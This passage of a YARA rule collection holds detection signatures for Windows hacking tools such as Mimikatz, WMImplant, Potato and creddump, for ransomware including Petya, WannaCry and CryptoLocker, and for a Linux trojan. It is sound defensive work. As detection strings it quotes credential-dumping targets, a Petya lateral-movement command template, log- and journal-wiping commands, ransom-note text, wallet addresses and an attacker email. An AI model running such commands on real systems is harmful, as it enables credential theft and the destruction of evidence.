		$s2 = "Benjamin DELPY `gentilkiwi`" fullword ascii wide
		$s3 = "http://blog.gentilkiwi.com/mimikatz" fullword ascii wide
		$s4 = "Build with love for POC only" fullword ascii wide
		$s5 = "gentilkiwi (Benjamin DELPY)" fullword wide
		$s6 = "KiwiSSP" fullword wide
		$s7 = "Kiwi Security Support Provider" fullword wide
		$s8 = "kiwi flavor !" fullword wide

	condition:
		any of them
}

rule BINARYALERT_Hacktool_Windows_Mimikatz_Files
{
	meta:
		description = "Mimikatz credential dump tool: Files"
		author = "@fusionrace"
		id = "ea4fd443-64dd-5466-8525-40c3a023e229"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://github.com/gentilkiwi/mimikatz"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/windows/hacktool_windows_mimikatz_files.yara#L1-L15"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "50d23cda49ca559da2e504e53b46b58679ea8bc07c501ff7764a3d142598adc8"
		score = 75
		quality = 80
		tags = ""
		md5_1 = "09054be3cc568f57321be32e769ae3ccaf21653e5d1e3db85b5af4421c200669"
		md5_2 = "004c07dcd04b4e81f73aacd99c7351337f894e4dac6c91dcfaadb4a1510a967c"

	strings:
		$s1 = "kiwifilter.log" fullword wide
		$s2 = "kiwissp.log" fullword wide
		$s3 = "mimilib.dll" fullword ascii wide

	condition:
		any of them
}

rule BINARYALERT_Hacktool_Windows_Mimikatz_Errors
{
	meta:
		description = "Mimikatz credential dump tool: Error messages"
		author = "@fusionrace"
		id = "94d50739-fc84-5bfe-821d-5e2851f681e3"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://github.com/gentilkiwi/mimikatz"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/windows/hacktool_windows_mimikatz_errors.yara#L1-L16"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "60fb94b9465b19af3b2df1b26490d4ac19a31a39f2f8c52f1059d37843769b36"
		score = 75
		quality = 80
		tags = ""
		md5_1 = "09054be3cc568f57321be32e769ae3ccaf21653e5d1e3db85b5af4421c200669"
		md5_2 = "004c07dcd04b4e81f73aacd99c7351337f894e4dac6c91dcfaadb4a1510a967c"

	strings:
		$s1 = "[ERROR] [LSA] Symbols" fullword ascii wide
		$s2 = "[ERROR] [CRYPTO] Acquire keys" fullword ascii wide
		$s3 = "[ERROR] [CRYPTO] Symbols" fullword ascii wide
		$s4 = "[ERROR] [CRYPTO] Init" fullword ascii wide

	condition:
		all of them
}

rule BINARYALERT_Hacktool_Windows_Mimikatz_Sekurlsa
{
	meta:
		description = "Mimikatz credential dump tool"
		author = "@fusionrace"
		id = "08fe62c5-f7a4-5985-a298-1d3c2c1744d4"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://github.com/gentilkiwi/mimikatz"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/windows/hacktool_windows_mimikatz_sekurlsa.yara#L1-L18"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "24e958c3cbda8e01dc2d84b3059114ea23f4b38db1676f7b72e5eabfa52b7335"
		score = 75
		quality = 80
		tags = ""
		SHA256_1 = "09054be3cc568f57321be32e769ae3ccaf21653e5d1e3db85b5af4421c200669"
		SHA256_2 = "004c07dcd04b4e81f73aacd99c7351337f894e4dac6c91dcfaadb4a1510a967c"

	strings:
		$s1 = "dpapisrv!g_MasterKeyCacheList" fullword ascii wide
		$s2 = "lsasrv!g_MasterKeyCacheList" fullword ascii wide
		$s3 = "!SspCredentialList" ascii wide
		$s4 = "livessp!LiveGlobalLogonSessionList" fullword ascii wide
		$s5 = "wdigest!l_LogSessList" fullword ascii wide
		$s6 = "tspkg!TSGlobalCredTable" fullword ascii wide

	condition:
		all of them
}

rule BINARYALERT_Hacktool_Windows_Ncc_Wmicmd
{
	meta:
		description = "Command shell wrapper for WMI"
		author = "@mimeframe"
		id = "18bc36f7-b97a-5bce-a68b-c349713e9468"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://github.com/nccgroup/WMIcmd"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/windows/hacktool_windows_ncc_wmicmd.yara#L1-L18"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "bef6828a706dcfc3b573523fccd391a5ef3fa505235b1621a82527d64d32aaf0"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "Need to specify a username, domain and password for non local connections" wide ascii
		$a2 = "WS-Management is running on the remote host" wide ascii
		$a3 = "firewall (if enabled) allows connections" wide ascii
		$a4 = "WARNING: Didn't see stdout output finished marker - output may be truncated" wide ascii
		$a5 = "Command sleep in milliseconds - increase if getting truncated output" wide ascii
		$b1 = "0x800706BA" wide ascii
		$b2 = "NTLMDOMAIN:" wide ascii
		$b3 = "cimv2" wide ascii

	condition:
		any of ( $a* ) or all of ( $b* )
}

rule BINARYALERT_Hacktool_Windows_Hot_Potato
{
	meta:
		description = "No description has been set in the source file - BinaryAlert"
		author = "@mimeframe"
		id = "dee13640-b4a9-5a39-af01-338c0197c995"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://github.com/foxglovesec/Potato"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/windows/hacktool_windows_hot_potato.yara#L1-L15"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "1ccee61660b3478294a5a4e1ca2b16c91156f6c877d0f83848cccd18a3f753f7"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "Parsing initial NTLM auth..." wide ascii
		$a2 = "Got PROPFIND for /test..." wide ascii
		$a3 = "Starting NBNS spoofer..." wide ascii
		$a4 = "Exhausting UDP source ports so DNS lookups will fail..." wide ascii
		$a5 = "Usage: potato.exe -ip" wide ascii

	condition:
		any of ( $a* )
}

rule BINARYALERT_Hacktool_Windows_Rdp_Cmd_Delivery
{
	meta:
		description = "Delivers a text payload via RDP (rubber ducky)"
		author = "@fusionrace"
		id = "8d035721-34ee-566f-8851-1c9501de2704"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://github.com/nopernik/mytools/blob/master/rdp-cmd-delivery.sh"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/windows/hacktool_windows_rdp_cmd_delivery.yara#L1-L14"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "98bc02bb651fba069828b5960ee47542828f0d530e5e280b15abb0573b8e0168"
		score = 75
		quality = 80
		tags = ""

	strings:
		$s1 = "Usage: rdp-cmd-delivery.sh OPTIONS" ascii wide
		$s2 = "[--tofile 'c:\\test.txt' local.ps1 #will copy contents of local.ps1 to c:\\test.txt" ascii wide
		$s3 = "-cmdfile local.bat                #will execute everything from local.bat" ascii wide
		$s4 = "To deliver powershell payload, use '--cmdfile script.ps1' but inside powershell console" ascii wide

	condition:
		any of them
}

rule BINARYALERT_Hacktool_Windows_Moyix_Creddump
{
	meta:
		description = "creddump is a python tool to extract credentials and secrets from Windows registry hives."
		author = "@mimeframe"
		id = "46df781a-abab-5593-99f9-1a6b993904cb"
		date = "2017-09-12"
		modified = "2017-09-12"
		reference = "https://github.com/moyix/creddump"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/windows/hacktool_windows_moyix_creddump.yara#L1-L16"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "3f2f4c5069fcb3d3b1d293a471bcf9489f058f27cd385885ab2bb4f719a3bd9d"
		score = 75
		quality = 80
		tags = ""

	strings:
		$a1 = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%" wide ascii
		$a2 = "0123456789012345678901234567890123456789" wide ascii
		$a3 = "NTPASSWORD" wide ascii
		$a4 = "LMPASSWORD" wide ascii
		$a5 = "aad3b435b51404eeaad3b435b51404ee" wide ascii
		$a6 = "31d6cfe0d16ae931b73c59d7e0c089c0" wide ascii

	condition:
		all of ( $a* )
}

rule BINARYALERT_Hacktool_Windows_Wmi_Implant
{
	meta:
		description = "A PowerShell based tool that is designed to act like a RAT"
		author = "@fusionrace"
		id = "cd90ef31-6e15-5518-8278-98e99e379916"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/hacktool/windows/hacktool_windows_wmi_implant.yara#L1-L21"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		logic_hash = "8b02fd265b04b9675a99b9638fdd179c8a86ed3afd7506195f3d3dcb2417d74d"
		score = 75
		quality = 80
		tags = ""

	strings:
		$s1 = "This really isn't applicable unless you are using WMImplant interactively." fullword ascii wide
		$s2 = "What command do you want to run on the remote system? >" fullword ascii wide
		$s3 = "Do you want to [create] or [delete] a string registry value? >" fullword ascii wide
		$s4 = "Do you want to run a WMImplant against a list of computers from a file? [yes] or [no] >" fullword ascii wide
		$s5 = "What is the name of the service you are targeting? >" fullword ascii wide
		$s6 = "This function enables the user to upload or download files to/from the attacking machine to/from the targeted machine" fullword ascii wide
		$s7 = "gen_cli - Generate the CLI command to execute a command via WMImplant" fullword ascii wide
		$s8 = "exit - Exit WMImplant" fullword ascii wide
		$s9 = "Lateral Movement Facilitation" fullword ascii wide
		$s10 = "vacant_system - Determine if a user is away from the system." fullword ascii wide
		$s11 = "Please provide the ProcessID or ProcessName flag to specify the process to kill!" fullword ascii wide

	condition:
		any of them
}

rule BINARYALERT_Ransomware_Windows_Petya_Variant_1
{
	meta:
		description = "Petya Ransomware new variant June 2017 using ETERNALBLUE"
		author = "@fusionrace"
		id = "bf56c0e4-585c-509b-a182-a93c74be7524"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://gist.github.com/vulnersCom/65fe44d27d29d7a5de4c176baba45759"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/ransomware/windows/ransomware_windows_petya_variant_1.yara#L1-L18"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "71b6a493388e7d0b40c83ce903bc6b04"
		logic_hash = "3733834ee2271a483739b09c4222d222aa4899cab48fd8fc558bdbd9a66bf2d6"
		score = 75
		quality = 80
		tags = ""

	strings:
		$s1 = "Ooops, your important files are encrypted." fullword ascii wide
		$s2 = "Send your Bitcoin wallet ID and personal installation key to e-mail" fullword ascii wide
		$s3 = "wowsmith123456@posteo.net. Your personal installation key:" fullword ascii wide
		$s4 = "Send $300 worth of Bitcoin to following address:" fullword ascii wide
		$s5 = "have been encrypted.  Perhaps you are busy looking for a way to recover your" fullword ascii wide
		$s6 = "need to do is submit the payment and purchase the decryption key." fullword ascii wide

	condition:
		any of them
}

rule BINARYALERT_Ransomware_Windows_Zcrypt
{
	meta:
		description = "Zcrypt will encrypt data and append the .zcrypt extension to the filenames"
		author = "@fusionrace"
		id = "d79cd266-4e77-562c-975c-8bf72efe7242"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://blog.malwarebytes.com/threat-analysis/2016/06/zcrypt-ransomware/"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/ransomware/windows/ransomware_windows_zcrypt.yara#L1-L23"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "d1e75b274211a78d9c5d38c8ff2e1778"
		logic_hash = "df4073363da162e69f29493b5bfb4cb3f3d342357335c13ba6a3ac868607cb25"
		score = 75
		quality = 78
		tags = ""

	strings:
		$u1 = "How to Buy Bitcoins" ascii wide
		$u2 = "ALL YOUR PERSONAL FILES ARE ENCRYPTED" ascii wide
		$u3 = "Click Here to Show Bitcoin Address" ascii wide
		$u4 = "MyEncrypter2.pdb" fullword ascii wide
		$g1 = ".p7b" fullword ascii wide
		$g2 = ".p7c" fullword ascii wide
		$g3 = ".pdd" fullword ascii wide
		$g4 = ".pef" fullword ascii wide
		$g5 = ".pem" fullword ascii wide
		$g6 = "How to decrypt files.html" fullword ascii wide

	condition:
		any of ( $u* ) or all of ( $g* )
}

rule BINARYALERT_Ransomware_Windows_Petya_Variant_2
{
	meta:
		description = "Petya Ransomware new variant June 2017 using ETERNALBLUE"
		author = "@fusionrace"
		id = "6401fd7e-5ef7-58b5-b8d3-a63c70e8daa3"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://gist.github.com/vulnersCom/65fe44d27d29d7a5de4c176baba45759"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/ransomware/windows/ransomware_windows_petya_variant_2.yara#L1-L17"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "71b6a493388e7d0b40c83ce903bc6b04"
		logic_hash = "7e04ffd0423cd1288af5c045bb06930abb732c0ea059e329cafc05faecb4f982"
		score = 75
		quality = 78
		tags = ""

	strings:
		$s1 = "dllhost.dat" fullword wide
		$s2 = "\\\\%ws\\admin$\\%ws" fullword wide
		$s3 = "%s /node:\"%ws\" /user:\"%ws\" /password:\"%ws\"" fullword wide
		$s4 = "\\\\.\\PhysicalDrive" fullword wide
		$s5 = ".3ds.7z.accdb.ai.asp.aspx.avhd.back.bak.c.cfg.conf.cpp.cs.ctl.dbf.disk.djvu.doc.docx.dwg.eml.fdb.gz.h.hdd.kdbx.mail.mdb.msg.nrg.ora.ost.ova.ovf.pdf.php.pmf.ppt.pptx.pst.pvi.py.pyc.rar.rtf.sln.sql.tar.vbox.vbs.vcb.vdi.vfd.vmc.vmdk.vmsd.vmx.vsdx.vsv.work.xls.xlsx.xvd.zip." fullword wide

	condition:
		3 of them
}

rule BINARYALERT_Ransomware_Windows_Petya_Variant_Bitcoin
{
	meta:
		description = "Petya Ransomware new variant June 2017 using ETERNALBLUE: Bitcoin"
		author = "@fusionrace"
		id = "82d6ecc5-7c90-5d50-90ff-f54f8d87685d"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://gist.github.com/vulnersCom/65fe44d27d29d7a5de4c176baba45759"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/ransomware/windows/ransomware_windows_petya_variant_bitcoin.yara#L1-L13"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "71b6a493388e7d0b40c83ce903bc6b04"
		logic_hash = "9a5e183aa8e1387e76d5df4e967943b730ba780b6758af3ef23e21bb9e4ce3a6"
		score = 75
		quality = 80
		tags = ""

	strings:
		$s1 = "MIIBCgKCAQEAxP/VqKc0yLe9JhVqFMQGwUITO6WpXWnKSNQAYT0O65Cr8PjIQInTeHkXEjfO2n2JmURWV/uHB0ZrlQ/wcYJBwLhQ9EqJ3iDqmN19Oo7NtyEUmbYmopcq+YLIBZzQ2ZTK0A2DtX4GRKxEEFLCy7vP12EYOPXknVy/+mf0JFWixz29QiTf5oLu15wVLONCuEibGaNNpgq+CXsPwfITDbDDmdrRIiUEUw6o3pt5pNOskfOJbMan2TZu6zfhzuts7KafP5UA8/0Hmf5K3/F9Mf9SE68EZjK+cIiFlKeWndP0XfRCYXI9AJYCeaOu7CXF6U0AVNnNjvLeOn42LHFUK4o6JwIDAQAB" fullword wide

	condition:
		$s1
}

rule BINARYALERT_Ransomware_Windows_Cerber_Evasion
{
	meta:
		description = "Cerber Ransomware: Evades detection by machine learning applications"
		author = "@fusionrace"
		id = "6e2f44a9-bc0f-5071-9d80-ddfb778cfe5d"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "http://www.darkreading.com/vulnerabilities---threats/cerber-ransomware-now-evades-machine-learning/d/d-id/1328506"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/ransomware/windows/ransomware_windows_cerber_evasion.yara#L1-L15"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "bc62b557d48f3501c383f25d014f22df"
		logic_hash = "43b3b8be5a23b57f6c671abd8491cdc51af1cf3a3fe8a7be308150697cdb92ea"
		score = 75
		quality = 80
		tags = ""

	strings:
		$s1 = "38oDr5.vbs" fullword ascii wide
		$s2 = "8ivq.dll" fullword ascii wide
		$s3 = "jmsctls_progress32" fullword ascii wide

	condition:
		all of them
}

rule BINARYALERT_Ransomware_Windows_Hydracrypt
{
	meta:
		description = "HydraCrypt encrypts a victim’s files and appends the filenames with the extension “hydracrypt_ID_*"
		author = "@fusionrace"
		id = "9ebf205e-b6a9-55a3-b0c3-9b088790dc9a"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://securingtomorrow.mcafee.com/mcafee-labs/hydracrypt-variant-of-ransomware-distributed-by-angler-exploit-kit/"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/ransomware/windows/ransomware_windows_hydracrypt.yara#L1-L16"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "08b304d01220f9de63244b4666621bba"
		logic_hash = "3ecb3e6c269f4145e60b0e7bb0e896120ceb2db2123f847bf4bdf5d4490467d5"
		score = 75
		quality = 80
		tags = ""

	strings:
		$u0 = "oTraining" fullword ascii wide
		$u1 = "Stop Training" fullword ascii wide
		$u2 = "Play \"sound.wav\"" fullword ascii wide
		$u3 = "&Start Recording" fullword ascii wide
		$u4 = "7About record" fullword ascii wide

	condition:
		all of them
}

rule BINARYALERT_Ransomware_Windows_Cryptolocker
{
	meta:
		description = "The CryptoLocker malware propagated via infected email attachments, and via an existing botnet; when activated, the malware encrypts files stored on local and mounted network drives"
		author = "@fusionrace"
		id = "be205f4b-d078-5437-bacc-203c816db2fa"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://www.secureworks.com/research/cryptolocker-ransomware"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/ransomware/windows/ransomware_windows_cryptolocker.yara#L1-L21"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "012d9088558072bc3103ab5da39ddd54"
		logic_hash = "317cbc01b4c329befeb5b25478f7827298a26d21b872ae232c519febd9c547fc"
		score = 75
		quality = 80
		tags = ""

	strings:
		$u0 = "Paysafecard is an electronic payment method for predominantly online shopping" fullword ascii wide
		$u1 = "bb to select the method of payment and the currency." fullword ascii wide
		$u2 = "Where can I purchase a MoneyPak?" fullword ascii wide
		$u3 = "Ukash is electronic cash and e-commerce brand." fullword ascii wide
		$u4 = "You have to send below specified amount to Bitcoin address" fullword ascii wide
		$u5 = "cashU is a prepaid online" fullword ascii wide
		$u6 = "Your important files \\b encryption" fullword ascii wide
		$u7 = "Encryption was produced using a \\b unique\\b0  public key" fullword ascii wide
		$u8 = "then be used to pay online, or loaded on to a prepaid card or eWallet." fullword ascii wide
		$u9 = "Arabic online gamers and e-commerce buyers." fullword ascii wide

	condition:
		2 of them
}

rule BINARYALERT_Ransomware_Windows_Hddcryptora
{
	meta:
		description = "The HDDCryptor ransomware encrypts local harddisks as well as resources in network shares via Server Message Block (SMB)"
		author = "@fusionrace"
		id = "56d7f1f5-811d-58c9-9e1d-d2f48c01e167"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "http://blog.trendmicro.com/trendlabs-security-intelligence/bksod-by-ransomware-hddcryptor-uses-commercial-tools-to-encrypt-network-shares-and-lock-hdds/"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/ransomware/windows/ransomware_windows_HDDCryptorA.yara#L1-L23"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "498bdcfb93d13fecaf92e96f77063abf"
		logic_hash = "24c113be31c3df7b544a5789bf055f77471d450c07f0a6729a715e2a82b4d1f0"
		score = 75
		quality = 78
		tags = ""

	strings:
		$u1 = "You are Hacked" fullword ascii wide
		$u2 = "Your H.D.D Encrypted , Contact Us For Decryption Key" nocase ascii wide
		$u3 = "start hard drive encryption..." ascii wide
		$u4 = "Your hard drive is securely encrypted" ascii wide
		$g1 = "Wipe All Passwords?" ascii wide
		$g2 = "SYSTEM\\CurrentControlSet\\Services\\dcrypt\\config" ascii wide
		$g3 = "DiskCryptor" ascii wide
		$g4 = "dcinst.exe" fullword ascii wide
		$g5 = "dcrypt.exe" fullword ascii wide
		$g6 = "you can only use AES to encrypt the boot partition!" ascii wide

	condition:
		2 of ( $u* ) or 4 of ( $g* )
}

rule BINARYALERT_Ransomware_Windows_Powerware_Locky
{
	meta:
		description = "PowerWare Ransomware"
		author = "@fusionrace"
		id = "8a1a56af-7a9d-54ed-90b9-daf33735ee1e"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://researchcenter.paloaltonetworks.com/2016/07/unit42-powerware-ransomware-spoofing-locky-malware-family/"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/ransomware/windows/ransomware_windows_powerware_locky.yara#L1-L17"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "3433a4da9d8794709630eb06afd2b8c1"
		logic_hash = "64de34755f706a9fd4c876c473eed4f8922a4450c7ef135b0ab5e49c67363baf"
		score = 75
		quality = 78
		tags = ""

	strings:
		$s0 = "ScriptRunner.dll" fullword ascii wide
		$s1 = "ScriptRunner.pdb" fullword ascii wide
		$s2 = "fixed.ps1" fullword ascii wide

	condition:
		all of them
}

rule BINARYALERT_Ransomware_Windows_Petya_Variant_3
{
	meta:
		description = "Petya Ransomware new variant June 2017 using ETERNALBLUE"
		author = "@fusionrace"
		id = "cbf06e62-abe8-54af-b4f4-624ba9233e4b"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://gist.github.com/vulnersCom/65fe44d27d29d7a5de4c176baba45759"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/ransomware/windows/ransomware_windows_petya_variant_3.yara#L1-L13"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "71b6a493388e7d0b40c83ce903bc6b04"
		logic_hash = "4f21b394eb2dd0ebf416b018f438934fdc89cb896701d95b593477fc19abfe48"
		score = 75
		quality = 80
		tags = ""

	strings:
		$s1 = "wevtutil cl Setup & wevtutil cl System" fullword wide
		$s2 = "fsutil usn deletejournal /D %c:" fullword wide

	condition:
		any of them
}

rule BINARYALERT_Ransomware_Windows_Wannacry
{
	meta:
		description = "wannacry ransomware for windows"
		author = "@fusionrace"
		id = "0269b6f4-a47d-5683-aaaa-2141ca7f04dc"
		date = "2017-08-11"
		modified = "2017-08-11"
		reference = "https://securelist.com/blog/incidents/78351/wannacry-ransomware-used-in-widespread-attacks-all-over-the-world/"
		source_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/rules/public/ransomware/windows/ransomware_windows_wannacry.yara#L1-L23"
		license_url = "https://github.com/airbnb/binaryalert//blob/a9c0f06affc35e1f8e45bb77f835b92350c68a0b/LICENSE"
		hash = "4fef5e34143e646dbf9907c4374276f5"
		logic_hash = "c01f460c0f5e39cde5f553c966553fe693e5203cb020b8f571eac6fc193fa91b"
		score = 75
		quality = 50
		tags = ""

	strings:
		$a1 = "msg/m_chinese" wide ascii
		$a2 = ".wnry" wide ascii
		$a3 = "attrib +h" wide ascii
		$b1 = "WNcry@2ol7" wide ascii
		$b2 = "iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com" wide ascii
		$b3 = "115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn" wide ascii
		$b4 = "12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw" wide ascii
		$b5 = "13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94" wide ascii

	condition:
		all of ( $a* ) or any of ( $b* )
}

rule DEADBITS_Dacls_Trojan_Linux
{
	meta:
		description = "No description has been set in the source file - DeadBits"
		author = "Adam Swanda"
		id = "bb83ba2b-70a3-5a0f-9588-d93b7f07f67f"
		date = "2020-01-07"
		modified = "2020-01-07"
		reference = "https://github.com/deadbits/yara-rules"
		source_url = "https://github.com/deadbits/yara-rules//blob/d002f7ecee23e09142a3ac3e79c84f71dda3f001/rules/Dacls_Linux.yara#L1-L32"
		license_url = "N/A"
		logic_hash = "752d7daf9178e4fa20f2ce781c6ff70f83758f01479696f0808e1588da9a3d78"
		score = 75
		quality = 80
		tags = ""
		Author = "Adam M. Swanda"

	strings:
		$cls00 = "c_2910.cls" ascii fullword
		$cls01 = "k_3872.cls" ascii fullword
		$str00 = "{\"result\":\"ok\"}" ascii fullword
		$str01 = "SCAN  %s  %d.%d.%d.%d %d" ascii fullword
		$str02 = "/var/run/init.pid" ascii fullword
		$str03 = "/flash/bin/mountd" ascii fullword
		$str04 = "Name:" ascii fullword
		$str05 = "Uid:" ascii fullword
		$str06 = "Gid:" ascii fullword
		$str08 = "PPid:" ascii fullword
		$str09 = "session_id" ascii fullword

	condition:
		uint32be( 0x0 ) == 0x7f454c46 and ( ( all of ( $cls* ) ) or ( all of ( $str* ) ) )
}

rule DELIVRTO_SUSP_SVG_Foreignobject_Nov24
{
	meta:
		description = "Presence of foreignObject in SVG file"
		author = "delivr.to"
		id = "148ef54a-4389-58c9-be89-c1714ef08371"
		date = "2024-11-28"
		modified = "2024-11-28"
		reference = "https://github.com/delivr-to/detections"
		source_url = "https://github.com/delivr-to/detections/blob/376762d71eb1777874d366136595994378416ef5/yara-rules/svg_foreignobject.yar#L1-L12"
		license_url = "N/A"
		logic_hash = "51fdc105e826344b9e516a35178c37b6e4620781ee3a9ae64b9be181a13292e7"
		score = 40
		quality = 51
		tags = ""

	strings:
		$svg = "svg" ascii wide nocase
		$fo = "</foreignObject" ascii wide nocase

	condition:
		all of them
}

rule DELIVRTO_SUSP_HTML_WASM_Smuggling
{
	meta:
		description = "Presence of Base64 JavaScript blob loading WASM"
		author = "delivr.to"
		id = "fc83bb4f-ba8a-52d2-b9ce-632da5341f77"
		date = "2024-02-28"
		modified = "2024-05-24"
		reference = "https://github.com/delivr-to/detections"
		source_url = "https://github.com/delivr-to/detections/blob/376762d71eb1777874d366136595994378416ef5/yara-rules/html_wasm.yar#L1-L13"
		license_url = "N/A"
		logic_hash = "4bca88862c28db947c04c40e40fdecc682223d1eb90c98350fbd6c5d8c6c4636"
		score = 70
		quality = 80
		tags = ""

	strings:
		$wasm = "WebAssembly.Module" base64
		$int = "WebAssembly.Instance" base64
		$inst = "WebAssembly.instantiate" base64

	condition:
		all of them
}

rule ESET_Richheaders_Lazarus_Nukesped_Iconicpayloads_3CX_Q12023
{
	meta:
		description = "Rich Headers-based rule covering the IconicLoader and IconicStealer from the 3CX supply chain incident, and also payloads from the cryptocurrency campaigns from 2022-12"
		author = "ESET Research"
		id = "5c815d14-8a3e-5c6a-9dc3-988e0f31c094"
		date = "2023-03-31"
		modified = "2023-04-19"
		reference = "https://github.com/eset/malware-ioc"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/nukesped_lazarus/rich_headers_IconicPayloads_3CX.yar#L6-L23"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		hash = "3b88cda62cdd918b62ef5aa8c5a73a46f176d18b"
		hash = "cad1120d91b812acafef7175f949dd1b09c6c21a"
		hash = "5b03294b72c0caa5fb20e7817002c600645eb475"
		hash = "7491bd61ed15298ce5ee5ffd01c8c82a2cdb40ec"
		logic_hash = "f11a1db798bfcc534982bdf6afaae154b095b6a1e0896e75e2791c01e51a1c16"
		score = 75
		quality = 80
		tags = ""

	condition:
